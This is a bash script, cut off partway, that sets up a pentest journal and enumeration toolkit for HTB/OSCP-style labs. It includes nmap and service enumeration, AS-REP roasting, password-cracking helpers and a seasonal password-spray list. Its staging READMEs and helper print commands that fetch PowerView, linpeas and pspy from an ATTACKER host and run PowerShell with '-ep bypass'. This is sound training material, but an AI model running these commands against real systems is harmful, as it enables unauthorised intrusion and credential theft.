#!/usr/bin/env bash
# htb_oscp_cpts_journal_aio.sh
# Purpose: Modular, self-healing pentest journal + automation tuned for HTB + CPTS + OSCP-style labs.
#
# Key differences vs eCPPT-tuned version:
# - Two-pass scanning: FAST (top ports) -> TARGETED scripts -> optional FULL (-p-)
# - Adds common OSCP/CPTS services & fallbacks (SNMP/NFS/SMTP/DNS/MSSQL/WinRM/RDP/etc.)
# - Web enum prefers ffuf/feroxbuster; gobuster fallback
# - Evidence/flags structure supports HTB (user.txt/root.txt) + OSCP (local.txt/proof.txt)
# - No assumption that hashcat/evil-winrm are broken; still keeps Impacket paths
# - Subnet discovery supports ICMP + TCP discovery fallback
#
# Usage:
#   ./htb_oscp_cpts_journal_aio.sh
# Then in a NEW shell:
#   makebox Sauna 10.10.10.175
#   enum --box Sauna --full        # optional full port scan
#   enum --box Lab 192.168.56.0/24 # subnet mode
#
set -euo pipefail

ROOT="${HOME}/pentest-journal"
TEMPLATE="${ROOT}/template"
BOXES="${ROOT}/boxes"
BIN="${ROOT}/bin"
CFG="${ROOT}/config"
WLISTS="${ROOT}/wordlists"

umask 022

say()  { printf "\033[1;32m[+]\033[0m %s\n" "$*"; }
warn() { printf "\033[1;33m[!]\033[0m %s\n" "$*"; }
die()  { printf "\033[1;31m[x]\033[0m %s\n" "$*"; exit 1; }

have() { command -v "$1" >/dev/null 2>&1; }
ensure_dir() { mkdir -p "$1"; }

append_if_missing() {
  local file="$1"
  local marker="$2"
  local content="$3"
  ensure_dir "$(dirname "$file")"
  touch "$file"
  if ! grep -qF "$marker" "$file"; then
    printf "\n%s\n" "$content" >> "$file"
  fi
}

# --- Folders (self-healing) ---
say "Creating folders under ${ROOT}"
ensure_dir "${TEMPLATE}"
ensure_dir "${BOXES}"
ensure_dir "${BIN}"
ensure_dir "${CFG}"
ensure_dir "${WLISTS}"

# Template modules
for d in \
  00_admin 01_scans 02_enum 03_web 04_ad 05_privesc 06_loot/files \
  07_notes 08_scripts 09_evidence/screenshots 09_evidence/proofs 10_staging/ps 10_staging/linux; do
  ensure_dir "${TEMPLATE}/${d}"
done

# --- Default config ---
if [[ ! -f "${CFG}/default.conf" ]]; then
  say "Writing ${CFG}/default.conf"
  cat > "${CFG}/default.conf" <<'EOF'
# default.conf (HTB/CPTS/OSCP tuned)

# ---- Scanning ----
# FAST: good initial coverage (OSCP/CPTS). FULL is optional switch.
NMAP_FAST_PORTS="21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,465,587,593,636,993,995,1433,1521,2049,3306,3389,5432,5985,5986,6379,8000,8080,8443,9000,9090,9200,27017"
NMAP_TIMING="-T4"
NMAP_EXTRA_ARGS="-Pn"
NMAP_FAST_MINRATE="1500"
NMAP_FULL_MINRATE="2000"

# Script sets (timeboxed / practical)
NMAP_DEFAULT_SCRIPTS="-sC -sV"
NMAP_SAFE_SCRIPTS="--script safe"
NMAP_VULN_SCRIPTS="--script vuln"

# UDP (optional): keep light; top N
UDP_TOP_PORTS="53,67,68,69,123,161,162,500,514,1900,5353"
RUN_UDP="0"

# ---- Web enum ----
# Prefer ffuf/ferox; gobuster fallback.
RUN_FFUF="1"
FFUF_WORDLIST="/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
FFUF_EXT="php,asp,aspx,jsp,txt,html,js,json,xml,bak,old,zip,tar,tar.gz"
FFUF_TIMEOUT="120"

RUN_FEROX="1"
FEROX_OPTS="-k -C 404 -x php,asp,aspx,jsp,txt,html,js,json,xml,bak,old -t 30 -d 2"

RUN_GOBUSTER="0"
GOBUSTER_WORDLIST="/usr/share/wordlists/dirb/common.txt"
GOBUSTER_EXT="php,txt,html,asp,aspx,jsp"
GOBUSTER_TIMEOUT="120"

RUN_WPSCAN="1"
WPSCAN_OPTS="--enumerate u,ap,at,tt,cb,dbe"

# ---- AD/Kerberos ----
DOMAIN=""
DC_IP=""
DNS_IP=""

# ---- Spraying / brute ----
ENABLE_SPRAY="0"
SPRAY_USERS_FILE=""
SPRAY_PASSWORDS_FILE=""
SPRAY_SUBNET=""

# ---- Wordlists pack ----
WLIST_ROOT="${HOME}/pentest-journal/wordlists"
WLIST_ROCKYOU="/usr/share/wordlists/rockyou.txt"
WLIST_XATO_10K="${HOME}/pentest-journal/wordlists/passwords/xato-net-10-million-passwords-10000.txt"
WLIST_SEASONS="${HOME}/pentest-journal/wordlists/passwords/seasons.txt"
WLIST_MONTHS="${HOME}/pentest-journal/wordlists/passwords/months.txt"
WLIST_COMBO="${HOME}/pentest-journal/wordlists/passwords/seasons_months_short.txt"

# ---- Cracking preference ----
CRACK_TOOL="john"   # john | hashcat (use what you have)
EOF
fi

# --- Template files ---
if [[ ! -f "${TEMPLATE}/00_admin/README.md" ]]; then
  say "Writing template admin README"
  cat > "${TEMPLATE}/00_admin/README.md" <<'EOF'
# Admin (HTB / CPTS / OSCP tuned)

## Scope / LOE
- Subnet/Targets:
- Constraints (time, creds rules, exam limits):
- Notes (reverts/resets, flaky services):

## Workflow assumptions (practical)
- Two-pass scan: **FAST ports → targeted scripts → optional FULL -p-**
- Prefer **repeatable evidence**: commands + outputs + screenshots for proofs
- Prefer **service-driven enum**: SMB/LDAP/Kerb/Web/SNMP/NFS, not “tool-driven”

## Checklist (start)
- [ ] Create box workspace (makebox)
- [ ] Run baseline enum (enum)
- [ ] Start notes (07_notes/box-notes.md)
- [ ] Track creds/hashes/tickets (06_loot/loot.md)
- [ ] Save proof artifacts (09_evidence/proofs + screenshots)
EOF
fi

if [[ ! -f "${TEMPLATE}/06_loot/loot.md" ]]; then
  say "Writing template loot.md"
  cat > "${TEMPLATE}/06_loot/loot.md" <<'EOF'
# Loot (Single Source of Truth)

## Flags / Proofs
| Type | Host | Path | Captured? | Notes |
|------|------|------|----------|------|
| HTB user.txt |  |  |  |  |
| HTB root.txt |  |  |  |  |
| OSCP local.txt |  |  |  |  |
| OSCP proof.txt |  |  |  |  |

## Credentials
| Where | User | Secret | Type | Verified On | Notes |
|------|------|--------|------|-------------|------|

## Hashes / Tickets
| Where | Identity | Hash/Ticket | Format | Cracked? | Notes |
|------|----------|-------------|--------|----------|------|

## Network / Hosts
| IP | Hostname | Role | Ports | Notes |
|----|----------|------|-------|------|

## Shares / Files
| Host | Share/Path | Why interesting | Status |
|------|------------|-----------------|--------|

## Web
| URL | Tech | Creds found | Vuln | Notes |
|-----|------|------------|------|------|

## Commands / One-liners worth keeping
EOF
fi

if [[ ! -f "${TEMPLATE}/07_notes/box-notes.md" ]]; then
  say "Writing template box-notes.md"
  cat > "${TEMPLATE}/07_notes/box-notes.md" <<'EOF'
# Box Notes (Expected vs Actual)

## Box
- Name:
- Date:
- Targets:
- Environment notes (resets/tool quirks):

## Hypothesis
- Likely entry: (SMB / Web / AD / SNMP / NFS / creds reuse)
- Likely privesc: (misconfig / kernel / service perms / AD path)

## Timeline
- T0 Discovery:
- T1 Foothold:
- T2 PrivEsc:
- T3 Lateral/Objective:

## Evidence checklist
- [ ] Nmap outputs saved
- [ ] Service enum outputs saved
- [ ] Loot table updated
- [ ] Proof screenshots taken
- [ ] Final path summary written

## Final Path Summary
- Entry → PrivEsc → Lateral → Proof/Flags

## Lessons / Patterns
- What repeated:
- What to do faster next time:
EOF
fi

if [[ ! -f "${TEMPLATE}/07_notes/instability-log.md" ]]; then
  say "Writing instability log"
  cat > "${TEMPLATE}/07_notes/instability-log.md" <<'EOF'
# Instability Log (HTB/Labs)

Use this when:
- A service is inconsistent across runs/resets
- Reverse shells die unexpectedly
- DNS/Kerb time skew issues appear

## Entry template
- Timestamp:
- Host/IP:
- Symptom:
- Expected:
- Observed:
- Tried:
- Reset performed? (Y/N)
- Outcome:
EOF
fi

if [[ ! -f "${TEMPLATE}/10_staging/ps/README.md" ]]; then
  say "Writing staging PS README"
  cat > "${TEMPLATE}/10_staging/ps/README.md" <<'EOF'
# PowerShell Staging

Drop your:
- PowerView.ps1
- PowerUp.ps1
- PrivescCheck.ps1
- winPEAS.ps1 (optional)

Serve:
- python3 -m http.server 8000

Windows download:
- certutil -urlcache -split -f http://ATTACKER:8000/PowerView.ps1 C:\Windows\Temp\PowerView.ps1
- powershell -ep bypass -f C:\Windows\Temp\PowerView.ps1
EOF
fi

if [[ ! -f "${TEMPLATE}/10_staging/linux/README.md" ]]; then
  say "Writing staging Linux README"
  cat > "${TEMPLATE}/10_staging/linux/README.md" <<'EOF'
# Linux Staging

Common drops:
- linpeas.sh
- pspy64
- chisel / ligolo agent
- exploit PoCs (timeboxed)

Serve:
- python3 -m http.server 8001

Linux download:
- curl -fsSL http://ATTACKER:8001/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
- wget -q http://ATTACKER:8001/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
EOF
fi

# --- Wordlists layout + sync helper ---
say "Ensuring wordlists layout"
ensure_dir "${WLISTS}/passwords"
ensure_dir "${WLISTS}/users"
ensure_dir "${WLISTS}/rules"
ensure_dir "${WLISTS}/custom"

if [[ ! -f "${WLISTS}/README.md" ]]; then
  cat > "${WLISTS}/README.md" <<'EOF'
# Wordlists Pack (HTB/CPTS/OSCP)

Recommended:
- /usr/share/wordlists/rockyou.txt (if present; unzip if needed)
- SecLists (raft, dns, usernames)
- Small “season/month/year” combos for sprays

Helpers:
- sync_wordlists
- mkcombo
EOF
fi

# mkcombo
if [[ ! -f "${BIN}/mkcombo" ]]; then
  cat > "${BIN}/mkcombo" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
ROOT="${HOME}/pentest-journal/wordlists/passwords"
OUT="${HOME}/pentest-journal/wordlists/passwords/seasons_months_short.txt"

: > "$OUT"
for f in seasons.txt months.txt; do
  [[ -f "${ROOT}/${f}" ]] && cat "${ROOT}/${f}" >> "$OUT"
done

# Practical variants (edit freely)
cat >> "$OUT" <<'EOV'
Winter2024!
Winter2025!
Winter2026!
Spring2024!
Spring2025!
Spring2026!
Summer2024!
Summer2025!
Summer2026!
Autumn2024!
Autumn2025!
Autumn2026!
Password123!
Welcome1!
Welcome123!
Company123!
Admin123!
P@ssw0rd!
EOV

echo "[+] Wrote $OUT"
EOF
  chmod +x "${BIN}/mkcombo"
fi

# sync_wordlists (adds rockyou discovery too)
if [[ ! -f "${BIN}/sync_wordlists" ]]; then
  cat > "${BIN}/sync_wordlists" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

DEST="${HOME}/pentest-journal/wordlists/passwords"
mkdir -p "${DEST}"

targets=(
  "xato-net-10-million-passwords-10000.txt"
  "seasons.txt"
  "months.txt"
)

search_roots=(
  "${HOME}"
  "${HOME}/Desktop"
  "${HOME}/Documents"
  "${HOME}/Downloads"
  "/usr/share/wordlists"
  "/usr/share/seclists"
)

found_any=0
for t in "${targets[@]}"; do
  if [[ -f "${DEST}/${t}" ]]; then
    echo "[=] Already have ${t}"
    continue
  fi
  found=""
  for r in "${search_roots[@]}"; do
    [[ -d "$r" ]] || continue
    match="$(find "$r" -maxdepth 7 -type f -name "$t" 2>/dev/null | head -n 1 || true)"
    if [[ -n "$match" ]]; then
      found="$match"
      break
    fi
  done
  if [[ -n "$found" ]]; then
    cp -n "$found" "${DEST}/${t}"
    echo "[+] Synced ${t} from: ${found}"
    found_any=1
  else
    echo "[!] Not found: ${t} (place into ${DEST}/ manually if needed)"
  fi
done

# RockYou note (don’t copy huge file; just inform)
if [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
  echo "[=] rockyou.txt present at /usr/share/wordlists/rockyou.txt"
elif [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
  echo "[!] rockyou.txt.gz found. You may need: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz"
else
  echo "[!] rockyou not found in /usr/share/wordlists"
fi

if [[ "$found_any" -eq 1 ]]; then
  echo "[+] Done. Run: mkcombo"
else
  echo "[!] Nothing synced."
fi
EOF
  chmod +x "${BIN}/sync_wordlists"
fi

# crack helper (john or hashcat)
if [[ ! -f "${BIN}/crack" ]]; then
  cat > "${BIN}/crack" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

usage() {
  cat <<'USAGE'
Usage:
  crack --tool john --hashfile <file> --wordlist <wl>
  crack --tool hashcat --mode <id> --hashfile <file> --wordlist <wl> [--rules <rulesfile>]

Examples:
  crack --tool john --hashfile asrep.txt --wordlist /usr/share/wordlists/rockyou.txt
  crack --tool hashcat --mode 18200 --hashfile asrep.txt --wordlist /usr/share/wordlists/rockyou.txt

Notes:
- Kerberos:
  AS-REP (hashcat mode 18200), Kerberoast (13100)
- Always store cracked creds into 06_loot/loot.md
USAGE
}

TOOL=""
MODE=""
HASHFILE=""
WORDLIST=""
RULES=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --tool) TOOL="$2"; shift 2;;
    --mode) MODE="$2"; shift 2;;
    --hashfile) HASHFILE="$2"; shift 2;;
    --wordlist) WORDLIST="$2"; shift 2;;
    --rules) RULES="$2"; shift 2;;
    -h|--help) usage; exit 0;;
    *) echo "[!] Unknown: $1"; usage; exit 1;;
  esac
done

[[ -z "$TOOL" || -z "$HASHFILE" || -z "$WORDLIST" ]] && usage && exit 1
[[ -f "$HASHFILE" ]] || { echo "[x] Missing hashfile: $HASHFILE"; exit 1; }
[[ -f "$WORDLIST" ]] || { echo "[x] Missing wordlist: $WORDLIST"; exit 1; }

if [[ "$TOOL" == "john" ]]; then
  command -v john >/dev/null 2>&1 || { echo "[x] john not found"; exit 1; }
  john --wordlist="$WORDLIST" "$HASHFILE" || true
  john --show "$HASHFILE" || true
elif [[ "$TOOL" == "hashcat" ]]; then
  command -v hashcat >/dev/null 2>&1 || { echo "[x] hashcat not found"; exit 1; }
  [[ -n "$MODE" ]] || { echo "[x] --mode required for hashcat"; exit 1; }
  if [[ -n "$RULES" && -f "$RULES" ]]; then
    hashcat -m "$MODE" "$HASHFILE" "$WORDLIST" -r "$RULES" --force || true
  else
    hashcat -m "$MODE" "$HASHFILE" "$WORDLIST" --force || true
  fi
  hashcat -m "$MODE" "$HASHFILE" --show || true
else
  echo "[x] Unknown tool: $TOOL"
  exit 1
fi
EOF
  chmod +x "${BIN}/crack"
fi

# stage_ps (extended: prints both PS and Linux staging)
if [[ ! -f "${BIN}/stage" ]]; then
  cat > "${BIN}/stage" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

usage() {
  cat <<'USAGE'
Usage:
  stage --box <BoxName> --attacker <ATTACKER_IP> [--psport 8000] [--linport 8001]

What it does:
- Ensures staging dirs exist:
  boxes/<Box>/10_staging/ps
  boxes/<Box>/10_staging/linux
- Prints common download one-liners for Windows + Linux
USAGE
}

BOX=""
ATT=""
PSPORT="8000"
LINPORT="8001"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --box) BOX="$2"; shift 2;;
    --attacker) ATT="$2"; shift 2;;
    --psport) PSPORT="$2"; shift 2;;
    --linport) LINPORT="$2"; shift 2;;
    -h|--help) usage; exit 0;;
    *) shift;;
  esac
done

[[ -z "$BOX" || -z "$ATT" ]] && usage && exit 1

ROOT="${HOME}/pentest-journal"
BOXDIR="${ROOT}/boxes/${BOX}"
PSDIR="${BOXDIR}/10_staging/ps"
LINDIR="${BOXDIR}/10_staging/linux"
mkdir -p "$PSDIR" "$LINDIR"

echo "[+] PS staging:   $PSDIR"
echo "    Serve: cd \"$PSDIR\" && python3 -m http.server $PSPORT"
echo "    Download (Windows):"
echo "      certutil -urlcache -split -f http://${ATT}:${PSPORT}/PowerView.ps1 C:\\Windows\\Temp\\PowerView.ps1"
echo "      powershell -ep bypass -f C:\\Windows\\Temp\\PowerView.ps1"
echo
echo "[+] Linux staging: $LINDIR"
echo "    Serve: cd \"$LINDIR\" && python3 -m http.server $LINPORT"
echo "    Download (Linux):"
echo "      curl -fsSL http://${ATT}:${LINPORT}/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
echo "      wget -q http://${ATT}:${LINPORT}/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64"
EOF
  chmod +x "${BIN}/stage"
fi

# --- makebox ---
if [[ ! -f "${BIN}/makebox" ]]; then
  say "Writing ${BIN}/makebox"
  cat > "${BIN}/makebox" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

ROOT="${HOME}/pentest-journal"
TEMPLATE="${ROOT}/template"
BOXES="${ROOT}/boxes"

usage() {
  cat <<'USAGE'
Usage:
  makebox <Name> <target_ip_or_subnet> [domain] [dc_ip]

Examples:
  makebox Sauna 10.10.10.175
  makebox Lab 192.168.56.0/24
  makebox Forest 10.10.10.161 DOMAIN.LOCAL 10.10.10.10
USAGE
}

[[ $# -lt 2 ]] && usage && exit 1

BOX="$1"
TARGET="$2"
DOMAIN="${3:-}"
DC_IP="${4:-}"

DEST="${BOXES}/${BOX}"
mkdir -p "${BOXES}"

if [[ -d "${DEST}" ]]; then
  echo "[!] ${DEST} exists. Self-healing: ensuring folders/files exist."
else
  cp -r "${TEMPLATE}" "${DEST}"
fi

for d in 00_admin 01_scans 02_enum 03_web 04_ad 05_privesc 06_loot/files 07_notes 08_scripts 09_evidence/screenshots 09_evidence/proofs 10_staging/ps 10_staging/linux hosts; do
  mkdir -p "${DEST}/${d}"
done

BOXCONF="${DEST}/box.conf"
if [[ ! -f "${BOXCONF}" ]]; then
  cat > "${BOXCONF}" <<EOF
# box.conf (per-box overrides)
TARGET="${TARGET}"

# AD (optional)
DOMAIN="${DOMAIN}"
DC_IP="${DC_IP}"
DNS_IP="${DC_IP}"

# Spray disabled by default (enable only when intentional + timeboxed)
ENABLE_SPRAY="0"
SPRAY_USERS_FILE="${DEST}/04_ad/users.txt"
SPRAY_PASSWORDS_FILE="${ROOT}/wordlists/passwords/seasons_months_short.txt"
SPRAY_SUBNET="${TARGET}"
EOF
fi

# Pre-fill notes
sed -i "s/- Name:$/- Name: ${BOX}/" "${DEST}/07_notes/box-notes.md" 2>/dev/null || true

if [[ "${TARGET}" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  mkdir -p "${DEST}/hosts/${TARGET}/{scans,enum,loot,notes,web,ad}"
fi

echo "[+] Ready: ${DEST}"
echo "    - Edit: ${BOXCONF}"
echo "    - Run:  enum --box \"${BOX}\""
EOF
  chmod +x "${BIN}/makebox"
fi

# --- enum (HTB/OSCP/CPTS tuned) ---
if [[ ! -f "${BIN}/enum" ]]; then
  say "Writing ${BIN}/enum"
  cat > "${BIN}/enum" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

ROOT="${HOME}/pentest-journal"
CFG_DEFAULT="${ROOT}/config/default.conf"

have() { command -v "$1" >/dev/null 2>&1; }
ts() { date +"%Y%m%d_%H%M%S"; }
say() { printf "\033[1;34m[enum]\033[0m %s\n" "$*"; }
warn(){ printf "\033[1;33m[enum]\033[0m %s\n" "$*"; }

usage() {
  cat <<'USAGE'
Usage:
  enum --box <Name> [--target <ip|subnet>] [--domain DOMAIN.LOCAL] [--dc <dc_ip>] [--fast] [--full] [--vuln] [--udp]

Modes:
  --fast : FAST ports scan only (still does service enum)
  --full : add full TCP port scan (-p-) after fast
  --vuln : add nmap vuln scripts (timeboxed)
  --udp  : add light UDP scan (top UDP_TOP_PORTS)

Notes:
- Outputs under boxes/<Box>/hosts/<ip>/{scans,enum,web,ad,loot}
USAGE
}

BOX=""
TARGET=""
DOMAIN=""
DC_IP=""
FAST_ONLY="0"
DO_FULL="0"
DO_VULN="0"
DO_UDP="0"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --box) BOX="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --domain) DOMAIN="$2"; shift 2;;
    --dc) DC_IP="$2"; shift 2;;
    --fast) FAST_ONLY="1"; shift;;
    --full) DO_FULL="1"; shift;;
    --vuln) DO_VULN="1"; shift;;
    --udp) DO_UDP="1"; shift;;
    -h|--help) usage; exit 0;;
    *) warn "Unknown arg: $1"; usage; exit 1;;
  esac
done

[[ -z "${BOX}" ]] && usage && exit 1
BOXDIR="${ROOT}/boxes/${BOX}"
[[ ! -d "${BOXDIR}" ]] && { warn "Box dir not found: ${BOXDIR}. Run: makebox ${BOX} <target>"; exit 1; }

# Load defaults then box.conf
# shellcheck disable=SC1090
source "${CFG_DEFAULT}"
if [[ -f "${BOXDIR}/box.conf" ]]; then
  # shellcheck disable=SC1090
  source "${BOXDIR}/box.conf"
fi

# CLI overrides (if provided)
[[ -n "${TARGET}" ]] && TARGET="${TARGET}"
[[ -n "${DOMAIN}" ]] && DOMAIN="${DOMAIN}"
[[ -n "${DC_IP}" ]] && DC_IP="${DC_IP}" && DNS_IP="${DC_IP}"

[[ -z "${TARGET:-}" ]] && { warn "No target set. Provide --target or set TARGET in ${BOXDIR}/box.conf"; exit 1; }

RUNLOG="${BOXDIR}/07_notes/enum_runs.log"
touch "${RUNLOG}"
echo "=== Run $(ts) target=${TARGET} full=${DO_FULL} vuln=${DO_VULN} udp=${DO_UDP} domain=${DOMAIN:-} dc=${DC_IP:-} ===" >> "${RUNLOG}"

# Helpers
parse_ports_from_gnmap() {
  local gn="$1"
  [[ -f "$gn" ]] || return 0
  # Extract open tcp ports like: 22/open/tcp//
  grep -Eo "[0-9]+/open/tcp" "$gn" | cut -d/ -f1 | sort -n | uniq | paste -sd, -
}

scan_host() {
  local ip="$1"
  local hostdir="${BOXDIR}/hosts/${ip}"
  mkdir -p "${hostdir}/scans" "${hostdir}/enum" "${hostdir}/web" "${hostdir}/ad" "${hostdir}/loot" "${hostdir}/notes"

  say "FAST scan ${ip} (ports: ${NMAP_FAST_PORTS})"
  local fastbase="${hostdir}/scans/${ip}_fast_${ts}"
  nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} --min-rate "${NMAP_FAST_MINRATE:-1500}" \
    -p "${NMAP_FAST_PORTS}" --open ${NMAP_DEFAULT_SCRIPTS:-} "${ip}" -oA "${fastbase}" >/dev/null 2>&1 || true

  local open_ports
  open_ports="$(parse_ports_from_gnmap "${fastbase}.gnmap")"
  echo "[*] ${ip} FAST open tcp ports: ${open_ports}" | tee -a "${RUNLOG}" >/dev/null

  # Optional FULL scan
  local full_ports=""
  if [[ "${DO_FULL}" == "1" ]]; then
    say "FULL scan ${ip} (-p-)"
    local fullbase="${hostdir}/scans/${ip}_full_${ts}"
    nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} --min-rate "${NMAP_FULL_MINRATE:-2000}" \
      -p- --open -sS "${ip}" -oA "${fullbase}" >/dev/null 2>&1 || true
    full_ports="$(parse_ports_from_gnmap "${fullbase}.gnmap")"
    echo "[*] ${ip} FULL open tcp ports: ${full_ports}" | tee -a "${RUNLOG}" >/dev/null
  fi

  # Merge ports for targeted scripts
  local merged_ports="${open_ports}"
  if [[ -n "${full_ports}" ]]; then
    if [[ -n "${merged_ports}" ]]; then
      merged_ports="${merged_ports},${full_ports}"
    else
      merged_ports="${full_ports}"
    fi
    merged_ports="$(echo "${merged_ports}" | tr ',' '\n' | sort -n | uniq | paste -sd, -)"
  fi

  if [[ -z "${merged_ports}" ]]; then
    warn "No open TCP ports detected for ${ip} (from chosen scan mode)."
  else
    say "TARGETED service scan ${ip} (ports: ${merged_ports})"
    local servbase="${hostdir}/scans/${ip}_services_${ts}"
    nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${merged_ports}" -sC -sV "${ip}" -oA "${servbase}" >/dev/null 2>&1 || true

    if [[ "${DO_VULN}" == "1" ]]; then
      say "VULN scripts ${ip} (timeboxed)"
      local vulnbase="${hostdir}/scans/${ip}_vuln_${ts}"
      timeout 300 nmap ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${merged_ports}" ${NMAP_VULN_SCRIPTS:-} "${ip}" -oA "${vulnbase}" >/dev/null 2>&1 || true
    fi
  fi

  # UDP (light)
  if [[ "${DO_UDP}" == "1" || "${RUN_UDP:-0}" == "1" ]]; then
    say "UDP light scan ${ip} (ports: ${UDP_TOP_PORTS})"
    local udpbase="${hostdir}/scans/${ip}_udp_${ts}"
    timeout 300 nmap -sU ${NMAP_EXTRA_ARGS:-} ${NMAP_TIMING:-} -p "${UDP_TOP_PORTS}" --open "${ip}" -oA "${udpbase}" >/dev/null 2>&1 || true
  fi

  # ---- Service-driven enumeration ----
  # Determine likely-open services by grepping latest services scan (fallback to fast)
  local scan_gn="${hostdir}/scans/${ip}_services_"*.gnmap
  local gnfile=""
  gnfile="$(ls -1 ${scan_gn} 2>/dev/null | tail -n 1 || true)"
  [[ -z "$gnfile" ]] && gnfile="${fastbase}.gnmap"

  local line ports_line
  ports_line="$(grep -Eo "Ports: .*" "$gnfile" 2>/dev/null | head -n1 | sed 's/Ports: //')"

  has() { [[ "${ports_line}" == *"$1"* ]]; }

  # SMB 445/139
  if has "445/open" || has "139/open"; then
    say "SMB enum ${ip}"
    if have smbclient; then
      timeout 30 smbclient -L "//${ip}" -N > "${hostdir}/enum/smb_shares_null.txt" 2>&1 || true
    fi
    if have rpcclient; then
      timeout 30 rpcclient -U "" -N "${ip}" -c "srvinfo; enumdomusers; querydominfo" > "${hostdir}/enum/rpc_null.txt" 2>&1 || true
    fi
    if have nxc; then
      nxc smb "${ip}" --shares --sessions > "${hostdir}/enum/nxc_smb.txt" 2>&1 || true
    elif have netexec; then
      netexec smb "${ip}" --shares --sessions > "${hostdir}/enum/netexec_smb.txt" 2>&1 || true
    elif have crackmapexec; then
      crackmapexec smb "${ip}" --shares --sessions > "${hostdir}/enum/cme_smb.txt" 2>&1 || true
    fi
  fi

  # WinRM 5985/5986
  if has "5985/open" || has "5986/open"; then
    say "WinRM presence ${ip}"
    if have evil-winrm; then
      echo "[*] evil-winrm available. Use with creds if found:" > "${hostdir}/enum/winrm_hint.txt"
      echo "    evil-winrm -i ${ip} -u USER -p PASS" >> "${hostdir}/enum/winrm_hint.txt"
    fi
    if have nxc; then
      nxc winrm "${ip}" > "${hostdir}/enum/nxc_winrm.txt" 2>&1 || true
    fi
  fi

  # RDP 3389
  if has "3389/open"; then
    say "RDP presence ${ip}"
    if have xfreerdp; then
      echo "[*] xfreerdp hint (with creds): xfreerdp /v:${ip} /u:USER /p:PASS /dynamic-resolution +clipboard" > "${hostdir}/enum/rdp_hint.txt"
    fi
  fi

  # LDAP/Kerberos AD quick checks
  if has "88/open" || has "389/open" || has "636/open" || has "3268/open"; then
    say "AD/Kerb signals on ${ip}"
    if [[ -n "${DOMAIN:-}" && -n "${DC_IP:-}" ]]; then
      local users="${BOXDIR}/04_ad/users.txt"
      touch "${users}"

      if have ldapsearch; then
        ldapsearch -x -H "ldap://${DC_IP}" -s base > "${hostdir}/ad/ldap_base.txt" 2>&1 || true
      fi

      if have kerbrute && [[ -s "${users}" ]]; then
        kerbrute userenum -d "${DOMAIN}" --dc "${DC_IP}" "${users}" > "${hostdir}/ad/kerbrute_userenum.txt" 2>&1 || true
      fi

      if have impacket-GetNPUsers && [[ -s "${users}" ]]; then
        impacket-GetNPUsers "${DOMAIN}/" -dc-ip "${DC_IP}" -usersfile "${users}" -format hashcat \
          -outputfile "${hostdir}/loot/asrep.txt" > "${hostdir}/ad/getnpusers.txt" 2>&1 || true
      fi
    else
      warn "Set DOMAIN and DC_IP in box.conf to enable kerb/ldap helpers."
    fi
  fi

  # DNS 53
  if has "53/open"; then
    say "DNS enum ${ip}"
    if have dig; then
      dig @"${ip}" version.bind chaos txt +short > "${hostdir}/enum/dns_versionbind.txt" 2>&1 || true
    fi
  fi

  # FTP 21
  if has "21/open"; then
    say "FTP enum ${ip}"
    if have nmap; then
      # Basic nmap scripts already in services scan; save hint file
      echo "[*] Try: ftp ${ip} (anonymous?)" > "${hostdir}/enum/ftp_hint.txt"
    fi
  fi

  # SMTP 25/587
  if has "25/open" || has "587/open"; then
    say "SMTP enum ${ip}"
    if have nc; then
      { echo "EHLO test"; sleep 1; echo "QUIT"; } | nc -nv "${ip}" 25 > "${hostdir}/enum/smtp_banner_25.txt" 2>&1 || true
    fi
  fi

  # SNMP 161 (udp) - only if udp scan enabled
  if [[ "${DO_UDP}" == "1" || "${RUN_UDP:-0}" == "1" ]]; then
    if have snmpwalk; then
      # only attempt common community 'public' quickly
      timeout 10 snmpwalk -v2c -c public "${ip}" 1.3.6.1.2.1.1 > "${hostdir}/enum/snmp_public_sys.txt" 2>&1 || true
    fi
  fi

  # NFS 2049
  if has "2049/open"; then
    say "NFS enum ${ip}"
    if have showmount; then
      showmount -e "${ip}" > "${hostdir}/enum/nfs_exports.txt" 2>&1 || true
    fi
  fi

  # MSSQL 1433
  if has "1433/open"; then
    say "MSSQL presence ${ip}"
    echo "[*] If creds found, try impacket-mssqlclient" > "${hostdir}/enum/mssql_hint.txt"
    echo "    impacket-mssqlclient DOMAIN/USER:PASS@${ip} -windows-auth" >> "${hostdir}/enum/mssql_hint.txt"
  fi

  # Web 80/443/8080/8443/8000
  for p in 80 443 8080 8443 8000; do
    if has "${p}/open"; then
      local proto="http"
      [[ "$p" == "443" || "$p" == "8443" ]] && proto="https"
      local url="${proto}://${ip}:${p}"
      [[ "$p" == "80" ]] && url="http://${ip}"
      [[ "$p" == "443" ]] && url="https://${ip}"

      say "Web enum ${url}"
      curl -ksI "${url}" -m 10 > "${hostdir}/web/headers_${p}.txt" 2>/dev/null || true
      curl -ksL "${url}/" -m 12 > "${hostdir}/web/home_${p}.html" 2>/dev/null || true

      if have whatweb; then
        whatweb "${url}" > "${hostdir}/web/whatweb_${p}.txt" 2>&1 || true
      fi

      if [[ "${RUN_FFUF:-0}" == "1" ]] && have ffuf; then
